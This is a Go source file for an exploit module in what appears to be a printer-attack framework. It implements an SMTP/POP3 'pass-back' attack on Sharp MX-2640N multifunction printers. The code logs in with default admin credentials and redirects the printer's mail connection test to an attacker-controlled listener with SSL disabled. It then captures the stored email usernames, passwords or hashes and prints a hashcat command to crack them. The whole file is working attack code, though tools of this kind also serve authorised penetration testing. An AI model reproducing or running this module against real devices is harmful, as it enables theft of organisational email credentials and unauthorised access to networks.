package safe

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"time"

	"papercut/internal/listener"
	"papercut/internal/modules"
	"papercut/internal/output"
)

func init() { register(func() modules.ExploitModule { return NewSharpMX2640PassBack() }) }

// SharpMX2640PassBack implements the Sharp MFP SMTP Pass-Back attack.
// It logs into the Sharp web interface, extracts SMTP configuration,
// enables POP before SMTP, disables SSL, then triggers a connection test
// redirected to the attacker's listeners to capture both POP3 and SMTP
// authentication credentials.
//
// Category: SAFE — uses the connection test function which does not modify saved settings.
type SharpMX2640PassBack struct {
	modules.BaseModule
}

// NewSharpMX2640PassBack creates a new instance of the Sharp SMTP Pass-Back module.
func NewSharpMX2640PassBack() *SharpMX2640PassBack {
	m := &SharpMX2640PassBack{
		BaseModule: modules.BaseModule{
			Mod: modules.Module{
				Name:         "sharp/smtp/mx2640_passback",
				Description:  "Sharp MX-2640N SMTP Pass-Back — redirects SMTP/POP3 test to capture email credentials",
				Manufacturer: "Sharp",
				Category:     "SAFE",
				Authors:      []string{"Waffl3ss"},
				Tags:         []string{"smtp", "pop3", "passback", "credentials", "sharp", "mfp", "email"},
				Models:       []string{"MX-2640N"},
			},
			Opts: []*modules.Option{
				{Name: "RHOST", Default: "", Required: true, Description: "Target IP address"},
				{Name: "RPORT", Default: "80", Required: false, Description: "Target HTTP port"},
				{Name: "LHOST", Default: "", Required: true, Description: "Listening IP for callbacks"},
				{Name: "LPORT", Default: "25", Required: false, Description: "Listening port for SMTP callback"},
				{Name: "POP_BEFORE_SMTP", Default: "true", Required: false, Description: "Enable POP before SMTP to capture POP3 credentials"},
			{Name: "POP_LPORT", Default: "110", Required: false, Description: "Listening port for POP3 callback"},
				{Name: "USERNAME", Default: "admin", Required: false, Description: "Login username"},
				{Name: "PASSWORD", Default: "admin", Required: false, Description: "Login password"},
				{Name: "SSL", Default: "false", Required: false, Description: "Use HTTPS instead of HTTP"},
				{Name: "VERBOSE", Default: "false", Required: false, Description: "Verbose output"},
				{Name: "TIMEOUT", Default: "60", Required: false, Description: "Callback timeout in seconds"},
			{Name: "PROXY", Default: "", Required: false, Description: "Proxy (socks5://host:port or http://host:port)"},
			},
		},
	}
	m.InitDefaults()
	return m
}

// sharpSMTPSettings holds the extracted SMTP configuration from the Sharp web interface.
type sharpSMTPSettings struct {
	primaryServer   string // ggt_textbox(1)
	secondaryServer string // ggt_textbox(2)
	port            string // ggt_textbox(3)
	timeout         string // ggt_textbox(4)
	replyEmail      string // ggt_textbox(5)
	smtpAuth        bool   // ggt_checkbox(6)
	smtpUsername    string // ggt_textbox(7)
	smtpPassword    string // ggt_textbox(8)
	popBeforeSMTP   bool   // ggt_checkbox(9)
	popServer       string // ggt_textbox(10)
	popPort         string // ggt_textbox(11)
	popAuth         bool   // ggt_checkbox(12)
	popUsername     string // ggt_textbox(13)
	popPassword     string // ggt_textbox(14)
	enableSSL       bool   // ggt_checkbox(22)
	popSSL          bool   // ggt_checkbox(23)
}

// Check tests whether the Sharp web interface accepts the configured credentials
// and can access the SMTP settings page.
func (s *SharpMX2640PassBack) Check() (*modules.CheckResult, error) {
	if err := s.Validate(); err != nil {
		return nil, err
	}
	rhost := s.Val("RHOST")
	rport := s.Val("RPORT")
	username := s.Val("USERNAME")
	password := s.Val("PASSWORD")
	verbose := s.BoolVal("VERBOSE")

	scheme := "http"
	if s.BoolVal("SSL") {
		scheme = "https"
	}
	baseURL := fmt.Sprintf("%s://%s:%s", scheme, rhost, rport)

	if verbose {
		output.Info("Checking credentials on %s:%s...", rhost, rport)
	}

	client, err := s.newHTTPClient()
	if err != nil {
		return nil, err
	}

	// Step 1: Login
	if verbose {
		output.Info("  Attempting login as %s...", username)
	}
	success, err := s.login(client, baseURL, username, password, verbose)
	if err != nil {
		return &modules.CheckResult{
			Success: false,
			Target:  rhost,
			Port:    s.IntVal("RPORT", 80),
			Details: fmt.Sprintf("Login request failed: %v", err),
		}, nil
	}

	result := &modules.CheckResult{
		Target:   rhost,
		Port:     s.IntVal("RPORT", 80),
		Username: username,
		Password: password,
	}

	if !success {
		result.Success = false
		result.Details = "Login credentials rejected"
		return result, nil
	}

	// Step 2: Verify SMTP page access
	if verbose {
		output.Info("  Verifying SMTP settings access...")
	}
	_, err = s.getSMTPSettings(client, baseURL, verbose)
	if err != nil {
		result.Success = false
		result.Details = fmt.Sprintf("Login succeeded but SMTP page inaccessible: %v", err)
		return result, nil
	}

	result.Success = true
	result.Details = "Credentials accepted, SMTP settings accessible"
	return result, nil
}

// Exploit performs the full SMTP/POP3 pass-back attack.
func (s *SharpMX2640PassBack) Exploit() (*modules.ExploitResult, error) {
	if err := s.Validate(); err != nil {
		return nil, err
	}

	rhost := s.Val("RHOST")
	rport := s.Val("RPORT")
	lhost := s.Val("LHOST")
	lport := s.Val("LPORT")
	popLPort := s.Val("POP_LPORT")
	username := s.Val("USERNAME")
	password := s.Val("PASSWORD")
	verbose := s.BoolVal("VERBOSE")
	usePOP := s.BoolVal("POP_BEFORE_SMTP")
	timeout := s.IntVal("TIMEOUT", 60)
	portInt := s.IntVal("RPORT", 80)

	scheme := "http"
	if s.BoolVal("SSL") {
		scheme = "https"
	}
	baseURL := fmt.Sprintf("%s://%s:%s", scheme, rhost, rport)

	client, err := s.newHTTPClient()
	if err != nil {
		return nil, err
	}

	// Step 1: Login
	output.Info("Logging into %s:%s as %s...", rhost, rport, username)

	success, err := s.login(client, baseURL, username, password, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Login failed: %v", err),
		}, nil
	}
	if !success {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: "Login rejected — credentials may be incorrect",
		}, nil
	}

	output.Success("Login successful")

	// Step 2: Get current SMTP settings
	output.Info("Extracting SMTP configuration...")

	settings, err := s.getSMTPSettings(client, baseURL, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Failed to get SMTP settings: %v", err),
		}, nil
	}

	if verbose {
		output.Info("  Primary SMTP server: %s:%s", settings.primaryServer, settings.port)
		output.Info("  SMTP Auth: %v, Username: %s", settings.smtpAuth, settings.smtpUsername)
		output.Info("  SMTP SSL: %v", settings.enableSSL)
		output.Info("  Reply email: %s", settings.replyEmail)
		output.Info("  POP before SMTP: %v", settings.popBeforeSMTP)
		if settings.popServer != "" {
			output.Info("  POP server: %s:%s (user: %s, SSL: %v)", settings.popServer, settings.popPort, settings.popUsername, settings.popSSL)
		}
	}

	if !settings.smtpAuth {
		output.Warn("SMTP Authentication is disabled on this device — no credentials to capture")
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: "SMTP Authentication is not enabled",
		}, nil
	}

	// Step 3: Start listeners
	// Bind to 0.0.0.0 (all interfaces) — LHOST is the redirect target, not the bind address.
	// On cloud instances (EC2/Azure/GCP) the public IP is NAT'd and not on the local interface.
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()

	popCredsCh := make(chan *listener.POP3Creds, 1)
	popErrCh := make(chan error, 1)

	if usePOP {
		popAddr := fmt.Sprintf("0.0.0.0:%s", popLPort)
		output.Info("Starting POP3 listener on 0.0.0.0:%s (redirect target: %s)...", popLPort, lhost)

		go func() {
			creds, err := listener.ListenPOP3(ctx, popAddr, time.Duration(timeout)*time.Second, verbose)
			if err != nil {
				popErrCh <- err
				return
			}
			popCredsCh <- creds
		}()
	}

	// SMTP listener
	smtpAddr := fmt.Sprintf("0.0.0.0:%s", lport)
	output.Info("Starting SMTP listener on 0.0.0.0:%s (redirect target: %s)...", lport, lhost)

	smtpCredsCh := make(chan *listener.SMTPCreds, 1)
	smtpErrCh := make(chan error, 1)

	go func() {
		creds, err := listener.ListenSMTP(ctx, smtpAddr, time.Duration(timeout)*time.Second, verbose)
		if err != nil {
			smtpErrCh <- err
			return
		}
		smtpCredsCh <- creds
	}()

	// Give listeners a moment to start
	time.Sleep(500 * time.Millisecond)

	// Step 4: Trigger test with SSL disabled, both redirected to us
	if usePOP {
		output.Info("Triggering connection test (POP→SMTP) to %s...", lhost)
	} else {
		output.Info("Triggering connection test (SMTP only) to %s...", lhost)
	}

	err = s.triggerSMTPTest(client, baseURL, settings, lhost, lport, popLPort, usePOP, verbose)
	if err != nil {
		cancel()
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Failed to trigger test: %v", err),
		}, nil
	}

	output.Info("Waiting for callbacks (timeout: %ds)...", timeout)

	// Step 5: Collect credentials
	var popCreds *listener.POP3Creds
	var smtpCreds *listener.SMTPCreds
	var capturedAny bool
	var dataLines []string

	// Wait for POP3 first if enabled (comes before SMTP in the flow).
	// Use a shorter timeout — if POP doesn't deliver creds quickly, fall through to SMTP.
	if usePOP {
		popTimer := time.NewTimer(15 * time.Second)
		defer popTimer.Stop()

		select {
		case creds := <-popCredsCh:
			popCreds = creds
			capturedAny = true
			fmt.Println()
			output.Success("Received POP3 AUTH from %s (method: %s)", creds.SourceIP, creds.AuthMethod)
			output.Success("POP3 Username: %s", creds.Username)
			if creds.Password != "" {
				output.Success("POP3 Password: %s", creds.Password)
				dataLines = append(dataLines, fmt.Sprintf("POP3 Username: %s", creds.Username))
				dataLines = append(dataLines, fmt.Sprintf("POP3 Password: %s", creds.Password))
			}
			if creds.Hash != "" {
				output.Success("POP3 Hash: %s", creds.Hash)
				output.Info("  Hashcat mode 10200 (CRAM-MD5)")
				output.Info("  hashcat -m 10200 hash.txt wordlist.txt")
				dataLines = append(dataLines, fmt.Sprintf("POP3 Username: %s", creds.Username))
				dataLines = append(dataLines, fmt.Sprintf("POP3 Hash: %s", creds.Hash))
				dataLines = append(dataLines, "POP3 Hashcat: -m 10200 (CRAM-MD5)")
			}
		case err := <-popErrCh:
			output.Warn("POP3: %v — continuing to wait for SMTP...", err)
		case <-popTimer.C:
			output.Warn("No POP3 credentials received — continuing to wait for SMTP...")
		}
	}

	// Wait for SMTP
	smtpTimer := time.NewTimer(time.Duration(timeout) * time.Second)
	defer smtpTimer.Stop()

	select {
	case creds := <-smtpCredsCh:
		smtpCreds = creds
		capturedAny = true
		fmt.Println()
		output.Success("Received SMTP AUTH from %s", creds.SourceIP)
		output.Success("SMTP Auth Method: %s", creds.AuthMethod)
		output.Success("SMTP Username: %s", creds.Username)
		output.Success("SMTP Password: %s", creds.Password)
		dataLines = append(dataLines, fmt.Sprintf("SMTP Username: %s", creds.Username))
		dataLines = append(dataLines, fmt.Sprintf("SMTP Password: %s", creds.Password))
		dataLines = append(dataLines, fmt.Sprintf("SMTP Auth: %s", creds.AuthMethod))
	case err := <-smtpErrCh:
		output.Error("SMTP listener: %v", err)
	case <-smtpTimer.C:
		output.Warn("No SMTP connection received")
	case <-ctx.Done():
		// Context expired but we may have POP creds already
	}

	if !capturedAny {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: "No credentials captured — timeout waiting for callbacks",
		}, nil
	}

	details := "Credentials captured via pass-back"
	if usePOP && popCreds != nil && smtpCreds != nil {
		details = "POP3 + SMTP credentials captured via pass-back"
	} else if popCreds != nil {
		details = "POP3 credentials captured via pass-back (no SMTP callback)"
	} else {
		details = "SMTP credentials captured via pass-back"
	}

	return &modules.ExploitResult{
		Success: true,
		Target:  rhost,
		Port:    portInt,
		Details: details,
		Data:    strings.Join(dataLines, "\n"),
	}, nil
}

func (s *SharpMX2640PassBack) newHTTPClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, fmt.Errorf("create cookie jar: %w", err)
	}
	return &http.Client{
		Jar:       jar,
		Timeout:   time.Duration(s.IntVal("TIMEOUT", 60)) * time.Second,
		Transport: modules.NewHTTPTransport(s.Val("PROXY")),
	}, nil
}

// login authenticates to the Sharp web interface.
// Sharp uses a POST to /login.html?/main.html with ggt_textbox form fields.
// Returns true if login succeeds (302 redirect to main.html).
func (s *SharpMX2640PassBack) login(client *http.Client, baseURL, username, password string, verbose bool) (bool, error) {
	loginURL := baseURL + "/login.html?/main.html"

	data := url.Values{
		"ggt_textbox(10002)": {username},
		"ggt_textbox(10003)": {password},
		"ggt_select(10004)":  {"0"},
		"action":             {"loginbtn"},
		"ordinate":           {"0"},
		"ggt_hidden(10008)":  {"0"},
	}

	// Disable redirect following so we can check for 302
	noRedirectClient := *client
	noRedirectClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	resp, err := noRedirectClient.PostForm(loginURL, data)
	if err != nil {
		return false, fmt.Errorf("login request: %w", err)
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)

	if verbose {
		output.Info("  Login response status: %d", resp.StatusCode)
		if loc := resp.Header.Get("Location"); loc != "" {
			output.Info("  Redirect: %s", loc)
		}
	}

	// Successful login returns 302 redirect to /main.html with MFPSESSIONID cookie
	if resp.StatusCode == 302 {
		loc := resp.Header.Get("Location")
		if strings.Contains(loc, "main.html") {
			// Follow the redirect to establish the session
			mainURL := baseURL + "/" + strings.TrimPrefix(loc, "/")
			mainResp, err := client.Get(mainURL)
			if err == nil {
				defer mainResp.Body.Close()
				io.ReadAll(mainResp.Body)
			}
			return true, nil
		}
	}

	return false, nil
}

// getSMTPSettings fetches the SMTP configuration page and extracts current values.
func (s *SharpMX2640PassBack) getSMTPSettings(client *http.Client, baseURL string, verbose bool) (*sharpSMTPSettings, error) {
	smtpURL := baseURL + "/nw_service_smtp.html"

	resp, err := client.Get(smtpURL)
	if err != nil {
		return nil, fmt.Errorf("get SMTP page: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read SMTP page: %w", err)
	}
	bodyStr := string(body)

	if verbose {
		output.Info("  SMTP page received (%d bytes)", len(body))
	}

	// Verify we're authenticated (page should contain SMTP settings, not login redirect)
	if strings.Contains(bodyStr, "loginSubmit") && !strings.Contains(bodyStr, "ggt_textbox(1)") {
		return nil, fmt.Errorf("not authenticated — SMTP page not accessible")
	}

	settings := &sharpSMTPSettings{}
	settings.primaryServer = sharpExtractValue(bodyStr, "ggt_textbox(1)")
	settings.secondaryServer = sharpExtractValue(bodyStr, "ggt_textbox(2)")
	settings.port = sharpExtractValue(bodyStr, "ggt_textbox(3)")
	settings.timeout = sharpExtractValue(bodyStr, "ggt_textbox(4)")
	settings.replyEmail = sharpExtractValue(bodyStr, "ggt_textbox(5)")
	settings.smtpAuth = sharpCheckboxChecked(bodyStr, "ggt_checkbox(6)")
	settings.smtpUsername = sharpExtractValue(bodyStr, "ggt_textbox(7)")
	settings.smtpPassword = sharpExtractValue(bodyStr, "ggt_textbox(8)")
	settings.popBeforeSMTP = sharpCheckboxChecked(bodyStr, "ggt_checkbox(9)")
	settings.popServer = sharpExtractValue(bodyStr, "ggt_textbox(10)")
	settings.popPort = sharpExtractValue(bodyStr, "ggt_textbox(11)")
	settings.popAuth = sharpCheckboxChecked(bodyStr, "ggt_checkbox(12)")
	settings.popUsername = sharpExtractValue(bodyStr, "ggt_textbox(13)")
	settings.popPassword = sharpExtractValue(bodyStr, "ggt_textbox(14)")
	settings.enableSSL = sharpCheckboxChecked(bodyStr, "ggt_checkbox(22)")
	settings.popSSL = sharpCheckboxChecked(bodyStr, "ggt_checkbox(23)")

	return settings, nil
}

// triggerSMTPTest submits the SMTP form with the attacker's servers and triggers a connection test.
// It force-disables SSL (so credentials come plaintext) and redirects SMTP to the attacker.
// If usePOP is true, it also force-enables POP before SMTP and redirects POP3 to the attacker.
// The Sharp web interface sends action=testButton which tests without permanently saving settings.
func (s *SharpMX2640PassBack) triggerSMTPTest(client *http.Client, baseURL string, settings *sharpSMTPSettings, lhost, smtpPort, popPort string, usePOP, verbose bool) error {
	smtpURL := baseURL + "/nw_service_smtp.html"

	data := url.Values{
		// SMTP settings — redirected to attacker
		"ggt_textbox(1)":  {lhost},    // Primary Server → attacker
		"ggt_textbox(2)":  {""},       // Clear secondary
		"ggt_textbox(3)":  {smtpPort}, // SMTP port → attacker
		"ggt_textbox(4)":  {settings.timeout},
		"ggt_textbox(5)":  {settings.replyEmail},
		"ggt_checkbox(6)": {"1"}, // Force SMTP Auth ON
		"ggt_textbox(7)":  {settings.smtpUsername},
		"ggt_textbox(8)":  {settings.smtpPassword}, // Masked — printer uses stored password
		// SSL disabled — omit ggt_checkbox(22) and ggt_checkbox(23) entirely
		// action=testButton triggers test without saving
		"action":   {"testButton"},
		"ordinate": {"0"},
	}

	if usePOP {
		// POP before SMTP — force enabled, redirected to attacker
		data.Set("ggt_checkbox(9)", "1")          // Force POP before SMTP ON
		data.Set("ggt_textbox(10)", lhost)        // POP3 Server → attacker
		data.Set("ggt_textbox(11)", popPort)      // POP3 port → attacker
		data.Set("ggt_checkbox(12)", "1")         // Force POP Auth ON
		data.Set("ggt_textbox(13)", settings.popUsername)
		data.Set("ggt_textbox(14)", settings.popPassword)
		data.Set("ggt_checkbox(23)", "1")         // Enable POP SSL (printer uses implicit TLS)
	} else {
		// Keep POP settings as-is from the device
		if settings.popBeforeSMTP {
			data.Set("ggt_checkbox(9)", "1")
		}
		data.Set("ggt_textbox(10)", settings.popServer)
		data.Set("ggt_textbox(11)", settings.popPort)
		if settings.popAuth {
			data.Set("ggt_checkbox(12)", "1")
		}
		data.Set("ggt_textbox(13)", settings.popUsername)
		data.Set("ggt_textbox(14)", settings.popPassword)
	}

	req, err := http.NewRequest("POST", smtpURL, strings.NewReader(data.Encode()))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Referer", smtpURL)

	if verbose {
		output.Info("  Sending test request:")
		output.Info("    SMTP → %s:%s (auth ON, SSL OFF)", lhost, smtpPort)
		if usePOP {
			output.Info("    POP3 → %s:%s (POP before SMTP ON, SSL ON)", lhost, popPort)
		} else {
			output.Info("    POP before SMTP: disabled")
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		// Connection might hang while printer attempts test — this is expected
		if verbose {
			output.Info("  Request returned error (may be expected during test): %v", err)
		}
		return nil
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)

	if verbose {
		output.Info("  Test request sent (status: %d)", resp.StatusCode)
	}

	return nil
}

// sharpExtractValue extracts the value attribute from a Sharp form input field.
// Sharp uses name="ggt_textbox(N)" convention.
func sharpExtractValue(html, fieldName string) string {
	// Escape parentheses for regex
	escaped := strings.ReplaceAll(fieldName, "(", `\(`)
	escaped = strings.ReplaceAll(escaped, ")", `\)`)

	// Match: name="fieldName" ... value="..."
	// The value attribute may appear before or after name in the tag
	pattern := `name="` + escaped + `"[^>]*value="([^"]*)"`
	re := regexp.MustCompile(pattern)
	matches := re.FindStringSubmatch(html)
	if len(matches) >= 2 {
		return matches[1]
	}

	// Try reverse order: value="..." ... name="fieldName"
	pattern = `value="([^"]*)"[^>]*name="` + escaped + `"`
	re = regexp.MustCompile(pattern)
	matches = re.FindStringSubmatch(html)
	if len(matches) >= 2 {
		return matches[1]
	}

	return ""
}

// sharpCheckboxChecked checks if a Sharp checkbox is checked.
func sharpCheckboxChecked(html, fieldName string) bool {
	escaped := strings.ReplaceAll(fieldName, "(", `\(`)
	escaped = strings.ReplaceAll(escaped, ")", `\)`)

	// Find the checkbox tag and check for CHECKED attribute
	pattern := `name="` + escaped + `"[^>]*`
	re := regexp.MustCompile(pattern)
	match := re.FindString(html)
	if match == "" {
		return false
	}

	return strings.Contains(strings.ToUpper(match), "CHECKED")
}
